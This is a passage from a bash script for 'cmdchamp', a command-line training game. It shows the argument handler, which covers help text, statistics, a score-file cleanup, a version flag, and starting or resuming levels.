  c|cleanup) [[ -f "$DATA/scores" ]] && { awk -F'|' '!seen[$1]++' "$DATA/scores" > "$DATA/scores.tmp" && mv "$DATA/scores.tmp" "$DATA/scores"; echo "Deduplicated scores."; } || echo "No scores file.";;
  s|stats) [[ -f "$DATA/profile" ]] && source "$DATA/profile"; stats;;
  v|version|-v|--version) echo "cmdchamp 0.3";;
  h|help|-h|--help)
    echo -e "${B}cmdchamp${N} - CLI trainer"
    echo -e "${D}29 levels, spaced repetition, sandbox execution${N}"
    echo
    echo "Usage: cmdchamp [--no-sandbox] [level|command]"
    echo
    echo "Options:"
    echo "  --no-sandbox  Disable sandbox (text-match only)"
    echo
    echo "Commands:"
    echo "  0-28      Start specific level"
    echo "  n|new     Start fresh from level 0"
    echo "  s|stats   Show mastery statistics"
    echo "  r|reset   Reset all progress"
    echo "  c|cleanup Deduplicate score file"
    echo "  h|help    Show this help"
    echo
    echo "Controls:"
    echo "  Tab      Toggle hint + explanations"
    echo "  Ctrl+d   Quit"
    echo "  ?        Show vi keybindings (in vi mode)"
    echo
    echo "Levels:"
    for lv in {0..28}; do
      printf "  %2d - %s\n" "$lv" "${LEVEL_DESC[$lv]}"
    done
    ;;
  n|new) _tty; _load_profile; LVL=0; QI=0; save; run "$LVL";;
  "") _tty; _load_profile; load; ((LVL>0||QI>0)) && { read -rp "Continue Level $LVL Q$((QI+1))? [Y/n] " yn; [[ "$yn" =~ ^[Nn] ]] && { LVL=0; QI=0; save; }; }; run "$LVL";;
  *) echo "Usage: cmdchamp [0-28|reset|stats|help|version]"; exit 1;;
esac
